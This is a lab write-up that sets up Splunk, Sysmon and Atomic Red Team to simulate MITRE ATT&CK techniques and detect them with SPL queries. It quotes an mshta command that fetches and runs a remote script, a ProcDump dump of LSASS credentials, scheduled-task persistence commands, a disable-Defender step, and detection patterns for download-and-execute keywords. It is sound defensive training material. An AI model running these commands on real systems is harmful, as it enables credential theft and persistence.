# 🛡️ Splunk & Atomic Red Team (ART) Lab Setup

> A complete SOC (Security Operations Centre) home lab environment using **VMware Workstation**, **Windows Server 2019**, **Kali Linux**, **Splunk**, **Sysmon**, and **Atomic Red Team (ART)** for attack simulation and detection engineering.

---

## 📌 Overview

This project demonstrates the end-to-end setup of a SOC detection lab, from provisioning virtual machines through to executing MITRE ATT&CK simulated attacks and detecting them in Splunk.

**The objective is to:**

- Build a Windows Server 2019 victim VM in VMware Workstation
- Install and configure Splunk Enterprise on Kali Linux as the indexer
- Deploy Sysmon on the Windows victim machine for deep telemetry
- Forward Windows/Sysmon logs to Splunk via Universal Forwarder
- Install Atomic Red Team (ART) on the victim machine
- Simulate MITRE ATT&CK techniques and detect them with Splunk SPL queries

---

## 🏗️ Lab Architecture

| Component | Role | IP Address |
|---|---|---|
| Kali Linux | Splunk Indexer (port 8000 GUI / port 9997 receiver) | `192.168.116.128` |
| Windows Server 2019 | Victim Machine + UF + Sysmon + ART | `192.168.116.133` |

```
┌─────────────────────────┐          Sysmon Logs via UF          ┌──────────────────────────┐
│   Windows Server 2019   │  ─────────────────────────────────►  │      Kali Linux          │
│   (WIN-SOC-LAB)         │         port 9997 (TCP)              │   Splunk Enterprise      │
│                         │                                       │   index = wineventlog    │
│  • Sysmon v15.20        │                                       │   GUI: port 8000         │
│  • Splunk UF v10.4.0    │                                       │                          │
│  • Atomic Red Team      │                                       │                          │
└─────────────────────────┘                                       └──────────────────────────┘
         192.168.116.133                                                  192.168.116.128
```

---

## ⚙️ 1. Windows Server 2019 VM Setup (VMware Workstation)

### 1.1 Create the Virtual Machine

In VMware Workstation, launch the **New Virtual Machine Wizard** and select **"I will install the operating system later"**.

![VMware manual install selected](images/20_vmware_manual_install_selected.png)

Select **Microsoft Windows → Windows Server 2019** as the Guest OS.

![Guest OS Windows Server 2019](images/21_guest_os_windows_server_2019.png)

Name the VM `Windows-Server-2019-SOC-Lab` and choose your storage location.

![VM name and location](images/22_windows_vm_name_location.png)

Set the disk size to **60 GB** (split into multiple files).

![VM disk 60GB](images/23_windows_vm_disk_60gb.png)

Review the final summary — Memory: **4312 MB**, Hard Disk: **60 GB**, Network: **NAT** — then click **Finish**.

![VM summary ready to create](images/24_25_26_windows_vm_memory_4gb.png)

### 1.2 Boot from ISO and Install Windows

Boot the VM and select **EFI VMware Virtual SATA CDROM Drive** to boot from the ISO.

![Windows boot from ISO](images/28_windows_boot_from_iso.png)

The Windows Server 2019 Setup wizard launches. Keep defaults: **English (United States)** language, **US** keyboard.

![Windows setup language screen](images/29_windows_setup_language_screen.png)

Select **Windows Server 2019 Standard Evaluation (Desktop Experience)** to install the full GUI environment.

![Desktop experience selected](images/30_windows_desktop_experience_selected.png)

Windows will copy files and begin installation automatically.

![Windows installing](images/31_windows_custom_install_disk_selected.png)

### 1.3 Post-Install: VMware Tools & Network Config

After installation completes, install **VMware Tools** for clipboard sharing, display scaling, and improved performance. Click **Finish** to complete the wizard.

![VMware Tools installed](images/33_vmware_tools_installed.png)

Open **PowerShell as Administrator** and confirm the hostname is `WIN-SOC-LAB`.

![Windows hostname WIN-SOC-LAB](images/34_windows_hostname_win_soc_lab.png)

Verify the IP address. The Windows victim machine is assigned `192.168.116.133` via NAT/DHCP.

![Windows ipconfig](images/35_windows_ipconfig.png)

Confirm network connectivity — ping the Kali Linux machine at `192.168.116.128`. All 4 packets should return successfully.

![Ping Kali success](images/36_windows_ping_kali_success.png)

Open a browser on the Windows machine and navigate to `http://192.168.116.128:8000` to confirm you can reach the Splunk web interface on Kali.

![Windows accessing Splunk Web GUI](images/37_windows_access_splunk_web.png)

Verify that TCP port 9997 (the Splunk forwarder receiver port) is reachable from Windows to Kali.

```powershell
Test-NetConnection 192.168.116.128 -Port 9997
```

`TcpTestSucceeded : True` confirms the path is open.

![Test-NetConnection 9997 success](images/38_windows_test_netconnection_9997_success.png)

Create a working folder `C:\Tools` to organise all downloaded tools.

```powershell
mkdir C:\Tools
cd C:\Tools
```

![Windows C:\Tools folder created](images/39_windows_tools_folder_created.png)

---

## 🖥️ 2. Splunk Enterprise Setup (Kali Linux)

### 2.1 Start Splunk

Start the Splunk daemon on Kali Linux. Splunk will validate indexes, check configuration, and start the web server on port 8000.

```bash
sudo /opt/splunk/bin/splunk start --run-as-root
```

![Kali Splunk started](images/39_kali_splunk_started_again.png)

Confirm Splunk is listening on port 8000.

```bash
sudo ss -tlnp | grep 8000
```

![Kali Splunk port 8000 listening](images/40_kali_splunk_port_8000_listening.png)

### 2.2 Splunk Web GUI

Access `http://192.168.116.128:8000` and log in with your admin credentials. The Splunk Enterprise dashboard confirms a successful installation.

![Splunk Web GUI - Administrator dashboard](images/37_windows_access_splunk_web.png)

### 2.3 Configure Receiving Port (9997)

In the Splunk GUI, navigate to:

```
Settings → Forwarding and Receiving → Configure Receiving → New Receiving Port
```

Add port `9997` and set status to **Enabled**. This tells Splunk to listen for incoming data from Universal Forwarders.

> ⚠️ **Important:** The index name used in the next section (`wineventlog`) must already exist in Splunk. Navigate to `Settings → Indexes → New Index` and create it if it does not exist.

---

## 🔍 3. Sysmon Installation (Windows Victim Machine)

Sysmon (System Monitor) provides deep Windows telemetry — process creation, network connections, file creation, registry changes — far beyond what standard Windows Event Logs capture.

### 3.1 Download Sysmon

Download and extract Sysmon directly from Microsoft Sysinternals using PowerShell:

```powershell
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "C:\Tools\Sysmon.zip"
Expand-Archive C:\Tools\Sysmon.zip -DestinationPath "C:\Tools\Sysmon" -Force
dir C:\Tools\Sysmon
```

The extracted folder contains `Sysmon.exe`, `Sysmon64.exe`, and `Sysmon64a.exe`.

![Sysmon download and extract](images/40_sysmon_download_extract.png)

### 3.2 Download Sysmon Configuration

Download the Wazuh community Sysmon XML configuration file, which provides comprehensive event rules covering most MITRE ATT&CK techniques:

```powershell
Invoke-WebRequest -Uri "https://wazuh.com/resources/blog/emulation-of-attack-techniques-and-detection-with-wazuh/sysmonconfig.xml" -OutFile "C:\Tools\Sysmon\sysmonconfig.xml"
dir C:\Tools\Sysmon\sysmonconfig.xml
```

![Sysmon config XML downloaded](images/41_sysmon_config_downloaded.png)

### 3.3 Install Sysmon with Configuration

Run the installer from within the Sysmon directory, accepting the EULA and applying the configuration:

```powershell
cd C:\Tools\Sysmon
.\Sysmon64.exe -accepteula -i .\sysmonconfig.xml
```

A successful install shows `Sysmon64 installed.`, `SysmonDrv started.`, and `Sysmon64 started.`

![Sysmon install command output](images/42_sysmon_install_command.png)

### 3.4 Verify Sysmon Service

Confirm the Sysmon64 service is in a **Running** state:

```powershell
Get-Service Sysmon64
```

![Sysmon64 service running](images/43_sysmon_service_running.png)

Open **Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon** to confirm the Sysmon channel is present.

![Event Viewer Sysmon Operational channel](images/44_event_viewer_sysmon_operational.png)

Query the live Sysmon event log to confirm events are being generated (Event IDs 7, 11, 17, 26, etc.):

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5 | Select-Object TimeCreated, Id, ProviderName
```

![Sysmon test events from log](images/45_sysmon_eventid_test_events.png)

---

## 📦 4. Splunk Universal Forwarder Installation (Windows)

### 4.1 Download the Universal Forwarder

Download the Splunk Universal Forwarder MSI for Windows x64 from [splunk.com/en_us/download/universal-forwarder.html](https://www.splunk.com/en_us/download/universal-forwarder.html). The file will be approximately 151 MB.

![Universal Forwarder MSI downloaded](images/46_universal_forwarder_msi_downloaded.png)

### 4.2 Installation — Configure Receiving Indexer

Run the MSI installer. When prompted for a **Receiving Indexer**, enter the Kali Linux IP and default port:

- **Hostname or IP:** `192.168.116.128`
- **Port:** `9997`

![UF receiving indexer configuration](images/49_uf_receiving_indexer_192_168_116_128_9997.png)

### 4.3 Post-Installation — Configure inputs.conf

Navigate to `C:\Program Files\SplunkUniversalForwarder\etc\system\local\` and create or edit `inputs.conf` to forward Sysmon logs:

```ini
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = 0
index = wineventlog
renderXml = true
```

![inputs.conf configured for Sysmon wineventlog](images/51_inputs_conf_sysmon_wineventlog.png)

### 4.4 Post-Installation — Configure outputs.conf

Create or edit `outputs.conf` in the same directory to point to the Kali Splunk indexer:

```ini
[tcpout]
defaultGroup = kali_indexer

[tcpout:kali_indexer]
server = 192.168.116.128:9997
```

![outputs.conf pointing to Kali indexer](images/52_outputs_conf_kali_9997.png)

### 4.5 Confirm SplunkForwarder Service is Running

```powershell
Get-Service SplunkForwarder
```

![SplunkForwarder service running](images/53_splunkforwarder_service_running.png)

---

## 🔄 5. Forwarder Validation

### 5.1 Check Active Forwarding

Run the following to confirm the forwarder is actively sending to the Kali indexer on port 9997:

```powershell
& "$SPLUNK_HOME\bin\splunk.exe" list forward-server
```

Expected output:

```
Active forwards:
        192.168.116.128:9997
Configured but inactive forwards:
        None
```

![UF list forward-server active](images/54_uf_list_forward_server.png)

### 5.2 Verify Sysmon Events Are Being Generated

Confirm the Sysmon operational log is actively logging events with recent timestamps. Event IDs 7, 11, 26, and 29 are all standard Sysmon events:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Select-Object TimeCreated, Id, ProviderName
```

![Windows Sysmon events exist - recent timestamps](images/55_windows_sysmon_events_exist.png)

### 5.3 Verify Logs Appear in Splunk

Open Splunk Search on Kali (`http://192.168.116.128:8000`) and run:

```spl
index=wineventlog
```

Over 1,300 events from `WIN-SOC-LAB` via `WinEventLog:Microsoft-Windows-Sysmon/Operational` confirms forwarding is working correctly.

![Splunk wineventlog events visible](images/60_splunk_wineventlog_events_visible.png)

Test with a known process search to validate process-level events are arriving:

```spl
index=wineventlog "notepad.exe" OR "calc.exe" OR "whoami"
```

![Splunk test process events visible](images/61_splunk_test_process_events_visible.png)

Validate that **Sysmon Event ID 1** (Process Create) events with `CommandLine` and `ParentImage` fields are present — these are the foundation of all detection queries:

```spl
index=wineventlog
| rex field=_raw "<EventID[^>]*>(?<EventID>\d+)</EventID>"
| rex field=_raw "<Data Name=[\"']UtcTime[\"']>(?<UtcTime>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']Image[\"']>(?<ProcessName>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']CommandLine[\"']>(?<CommandLine>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']ParentImage[\"']>(?<ParentProcess>[^<]*)</Data>"
| search EventID=1
| table _time UtcTime host EventID ProcessName CommandLine ParentProcess
| sort - _time
```

![Splunk EventID 1 process CommandLine table](images/62_splunk_eventid_1_process_commandline.png)

---

## ⚔️ 6. Atomic Red Team (ART) Setup (Windows Victim Machine)

### 6.1 Pre-requisites

> ⚠️ **Disable Windows Defender real-time protection** before installing ART. Without this step, PowerShell scripts and atomic payload files will be quarantined or blocked automatically.
>
> Go to: **Windows Security → Virus & threat protection → Manage settings → Real-time protection → Off**

### 6.2 Configure PowerShell Environment

Run the following commands one by one in an **Administrator PowerShell** session:

```powershell
# Enable TLS 1.2 for secure downloads
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Allow scripts to run
Set-ExecutionPolicy Bypass -Scope Process -Force

# Install NuGet package provider
Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force

# Trust PSGallery to avoid confirmation prompts
Set-PSRepository -Name "PSGallery" -InstallationPolicy Trusted
```

### 6.3 Install Required Modules

```powershell
Install-Module PowerShellGet -Force -AllowClobber
Install-Module powershell-yaml -Force
Install-Module Invoke-AtomicRedTeam -Force
```

![Atomic modules being installed](images/63_atomic_modules_installed.png)

### 6.4 Install Atomic Red Team and Download Atomics

```powershell
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics -Force
```

`Installation of Invoke-AtomicRedTeam is complete.` confirms success. All MITRE ATT&CK atomic definitions are now downloaded to `C:\AtomicRedTeam\atomics`.

![Atomic Red Team installed successfully](images/64_atomic_red_team_installed.png)

### 6.5 Set Atomics Path and Validate Installation

```powershell
$env:PathToAtomicsFolder = "C:\AtomicRedTeam\atomics"
Import-Module Invoke-AtomicRedTeam
Get-Command Invoke-AtomicTest
```

Expected output confirms version **2.3.0** is available.

![Invoke-AtomicTest verified v2.3.0](images/65_invoke_atomic_test_verified.png)

### 6.6 Explore Available Tests

List all available sub-tests for a given technique. For example, T1059.001 has 22 sub-tests:

```powershell
Invoke-AtomicTest T1059.001 -ShowDetailsBrief
```

![Atomic T1059 ShowDetailsBrief listing](images/66_atomic_t1059_showdetails.png)

---

## 📊 7. Attack Simulation & Detection (MITRE ATT&CK)

> All attack simulations were conducted in a controlled, isolated lab environment for educational and detection engineering purposes only.

The following base SPL (with rex field extraction) is used across all detections to parse Sysmon EventID 1 data from raw XML:

```spl
index=wineventlog
| rex field=_raw "<EventID[^>]*>(?<EventID>\d+)</EventID>"
| rex field=_raw "<Data Name=[\"']UtcTime[\"']>(?<UtcTime>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']Image[\"']>(?<ProcessName>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']CommandLine[\"']>(?<CommandLine>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']ParentImage[\"']>(?<ParentProcess>[^<]*)</Data>"
```

---

### 7.1 T1053.005 — Scheduled Task / Job (Persistence)

**Objective:** Create a scheduled task that runs a hidden script, establishing persistent access that survives reboots.

#### Pre-requisite Check

```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 1 -CheckPrereqs
```

Prerequisites for `T1053.005-1 Scheduled Task Startup Script` are confirmed as met.

![T1053.005 check prereqs](images/67_T1053_check_prereqs.png)

#### Attack Execution

```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 1
```

Two scheduled tasks are created: `T1053_005_OnStartup` (trigger: system start) and `T1053_005_OnLogon` (trigger: user logon). Both run `cmd.exe /c calc.exe` as SYSTEM.

![T1053.005 attack execution - tasks created](images/68_T1053_attack_execution.png)

#### SPL Detection Query

```spl
index=wineventlog
| rex field=_raw "<EventID[^>]*>(?<EventID>\d+)</EventID>"
| rex field=_raw "<Data Name=[\"']UtcTime[\"']>(?<UtcTime>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']Image[\"']>(?<ProcessName>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']CommandLine[\"']>(?<CommandLine>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']ParentImage[\"']>(?<ParentProcess>[^<]*)</Data>"
| search EventID=1
| search ProcessName="*\\schtasks.exe" OR CommandLine="*schtasks*" OR CommandLine="*Register-ScheduledTask*" OR CommandLine="*New-ScheduledTask*" OR CommandLine="*T1053*"
| table _time UtcTime host EventID ProcessName CommandLine ParentProcess
| sort - _time
```

#### Detection Result

3 events returned: `schtasks.exe` creating both persistence tasks with their full command lines visible. The parent process `cmd.exe` → `powershell.exe` chain is clearly captured.

![T1053.005 Splunk detection - 3 events](images/69_T1053_splunk_detection.png)

After running cleanup (`Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup`), the deletion events (`schtasks /delete`) also appear in the same index — demonstrating full lifecycle visibility.

![T1053.005 after cleanup - 6 events including deletions](images/70_T1053_cleanup.png)

#### Key Sysmon Event IDs

**Sysmon Event ID 1 (Process Create)** is the most helpful. It captures the exact `CommandLine` showing `schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"` and the parent-child process chain (`powershell.exe → cmd.exe → schtasks.exe`), enabling detection of both the persistence registration and subsequent deletions.

---

### 7.2 T1218.005 — Signed Binary Proxy Execution: Mshta (Defence Evasion)

**Objective:** Use `mshta.exe` (a legitimate Microsoft binary) to execute a remote `.hta` / JavaScript payload, bypassing application control policies.

#### Attack Execution

```powershell
Invoke-AtomicTest T1218.005 -TestNumbers 1
```

Test `T1218.005-1` executes: `mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();`

![T1218.005 MSHTA attack execution](images/73_T1218_mshta_attack_execution.png)

#### SPL Detection Query

```spl
index=wineventlog
| rex field=_raw "<EventID[^>]*>(?<EventID>\d+)</EventID>"
| rex field=_raw "<Data Name=[\"']UtcTime[\"']>(?<UtcTime>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']Image[\"']>(?<ProcessName>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']CommandLine[\"']>(?<CommandLine>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']ParentImage[\"']>(?<ParentProcess>[^<]*)</Data>"
| search EventID=1
| search ProcessName="*\\mshta.exe" OR CommandLine="*mshta*" OR CommandLine="*.hta*" OR CommandLine="*javascript:*" OR CommandLine="*vbscript:*"
| table _time UtcTime host EventID ProcessName CommandLine ParentProcess
| sort - _time
```

#### Detection Result

2 events captured: `mshta.exe` with the full inline JavaScript URL payload visible in `CommandLine`, and the parent `cmd.exe` spawning it. The remote GitHub URL for the `.sct` script is fully visible.

![T1218.005 MSHTA Splunk detection - 2 events](images/74_T1218_mshta_splunk_detection.png)

#### Cleanup

```powershell
$env:PathToAtomicsFolder="C:\AtomicRedTeam\atomics"
Invoke-AtomicTest T1218.005 -TestNumbers 1 -Cleanup
```

![T1218.005 cleanup complete](images/75_T1218_cleanup.png)

#### Key Sysmon Event IDs

**Sysmon Event ID 1 (Process Create)** is the most helpful. It captures `mshta.exe` being launched by a non-standard parent (`cmd.exe` / `powershell.exe` rather than Explorer), along with the full inline JavaScript-scheme command string and the remote GitHub URL, making this LOLBIN (Living-Off-the-Land Binary) abuse trivial to detect.

---

### 7.3 T1003.001 — OS Credential Dumping: LSASS Memory (Credential Access)

**Objective:** Use ProcDump to create a memory dump of the `lsass.exe` process, allowing offline extraction of NTLM hashes and Kerberos tickets.

#### Attack Execution

```powershell
Invoke-AtomicTest T1003.001 -TestNumbers 1
```

ProcDump v12.0 runs against `lsass.exe`, writing a 47 MB dump file to `C:\Windows\Temp\lsass_dump.dmp`.

![T1003.001 LSASS attack execution - ProcDump output](images/80_T1003_lsass_attack_execution.png)

#### SPL Detection Query

```spl
index=wineventlog
| rex field=_raw "<EventID[^>]*>(?<EventID>\d+)</EventID>"
| rex field=_raw "<Data Name=[\"']UtcTime[\"']>(?<UtcTime>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']Image[\"']>(?<ProcessName>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']CommandLine[\"']>(?<CommandLine>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']ParentImage[\"']>(?<ParentProcess>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']TargetImage[\"']>(?<TargetImage>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']TargetFilename[\"']>(?<TargetFilename>[^<]*)</Data>"
| search (EventID=1 AND (CommandLine="*lsass*" OR ProcessName="*\\procdump*")) OR (EventID=10 AND TargetImage="*\\lsass.exe") OR (EventID=11 AND TargetFilename="*.dmp")
| table _time UtcTime host EventID ProcessName CommandLine ParentProcess TargetImage TargetFilename
| sort - _time
```

#### Detection Result

7 events returned across three Sysmon Event IDs: **Event ID 1** (procdump64.exe process creation with `-accepteula -ma lsass.exe` command), **Event ID 10** (process access to `lsass.exe` with high-privilege access mask), and **Event ID 11** (dump file creation). The full attack chain is visible.

![T1003.001 LSASS Splunk detection - 7 events across EventIDs 1, 10, 11](images/81_T1003_lsass_splunk_detection.png)

#### Cleanup

```powershell
Invoke-AtomicTest T1003.001 -TestNumbers 1 -Cleanup
```

Removes the dump file: `Remove-Item C:\Windows\Temp\*.dmp -Force`

![T1003.001 cleanup complete](images/82_T1003_cleanup.png)

#### Key Sysmon Event IDs

- **Event ID 1 (Process Create):** Captures `procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp` with full CommandLine and parent process chain.
- **Event ID 10 (Process Access):** Records `procdump64.exe` opening a handle to `lsass.exe` — the most critical indicator of credential dumping. The `GrantedAccess` mask (e.g. `0x1FFFFF`) reveals the permission level requested.
- **Event ID 11 (File Create):** Logs the exact path of the `.dmp` file written to disk, completing the forensic trail.

---

### 7.4 T1059.001 — Command and Scripting Interpreter: PowerShell (Execution)

**Objective:** Use PowerShell to download and execute scripts or payloads directly from the internet, bypassing traditional file-based detection.

#### Attack Execution

```powershell
Invoke-AtomicTest T1059.001 -TestNumbers 1
```

> ℹ️ Screenshot for this execution step was not captured during the lab session.

#### SPL Detection Query

```spl
index=wineventlog
| rex field=_raw "<EventID[^>]*>(?<EventID>\d+)</EventID>"
| rex field=_raw "<Data Name=[\"']UtcTime[\"']>(?<UtcTime>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']Image[\"']>(?<ProcessName>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']CommandLine[\"']>(?<CommandLine>[^<]*)</Data>"
| rex field=_raw "<Data Name=[\"']ParentImage[\"']>(?<ParentProcess>[^<]*)</Data>"
| search EventID=1
| search ProcessName="*\\powershell.exe" OR ProcessName="*\\pwsh.exe"
| search CommandLine="*Invoke-WebRequest*" OR CommandLine="*IEX*" OR CommandLine="*Invoke-Expression*" OR CommandLine="*DownloadString*" OR CommandLine="*Net.WebClient*" OR CommandLine="*-enc*" OR CommandLine="*EncodedCommand*" OR CommandLine="*http://*" OR CommandLine="*https://*"
| eval is_suspicious=case(
    match(CommandLine,"(?i)IEX|Invoke-Expression"), "CRITICAL - Code Injection",
    match(CommandLine,"(?i)-enc|EncodedCommand"), "CRITICAL - Obfuscation",
    match(CommandLine,"(?i)DownloadString|Net.WebClient|Invoke-WebRequest"), "HIGH - Remote Download",
    match(CommandLine,"(?i)http://|https://"), "HIGH - Remote URL",
    1=1, "MEDIUM"
)
| table _time UtcTime host EventID ProcessName CommandLine ParentProcess is_suspicious
| sort - _time
```

#### Key Sysmon Event IDs

**Sysmon Event ID 1 (Process Create)** is the most helpful. It captures:
- **Remote Script Download and Execution:** `powershell.exe` using `DownloadString`, `Invoke-WebRequest`, or `Msxml2.ServerXMLHTTP` to fetch and run payloads from external URLs such as raw GitHub content.
- **Command Obfuscation:** Heavy Base64-encoded `-EncodedArguments` strings used to hide malicious intent from casual inspection.
- **In-Memory Payload Loading:** Strings such as `Invoke-Mimikatz`, `Get-Keystrokes`, or `Add-Persistence` passed directly into memory via `IEX` to bypass disk-based AV scanning.
- **Suspicious Shell Spawning:** `powershell.exe` spawned recursively or launched by `WmiPrvSE.exe`, indicating lateral movement or remote execution.

---

## ✅ Lab Summary

| Step | Component | Status |
|---|---|---|
| 1 | Windows Server 2019 VM (VMware) | ✅ Complete |
| 2 | Splunk Enterprise on Kali Linux | ✅ Running on port 8000 |
| 3 | Sysmon v15.20 with Wazuh config | ✅ Installed & generating events |
| 4 | Splunk Universal Forwarder v10.4.0 | ✅ Active → 192.168.116.128:9997 |
| 5 | Log forwarding validated | ✅ index=wineventlog receiving events |
| 6 | Atomic Red Team v2.3.0 | ✅ Installed with all atomics |
| 7.1 | T1053.005 — Scheduled Task | ✅ Simulated & Detected |
| 7.2 | T1218.005 — MSHTA Proxy Exec | ✅ Simulated & Detected |
| 7.3 | T1003.001 — LSASS Dump | ✅ Simulated & Detected |
| 7.4 | T1059.001 — PowerShell Exec | ✅ Simulated & SPL Provided |

---

## 🔐 Final Notes

- All simulations were run in an **isolated NAT network** inside VMware Workstation — no external systems were affected.
- Windows Defender was disabled **only within the lab VM** for the duration of ART testing.
- After each test, `Invoke-AtomicTest <TechniqueID> -Cleanup` was run to restore the system to a clean baseline.
- The Sysmon configuration used (Wazuh community ruleset) covers the vast majority of MITRE ATT&CK sub-techniques out of the box.

```
🛡️ Defense  |  🔎 Detection  |  ⚔️ Simulation  |  📊 Analysis
```
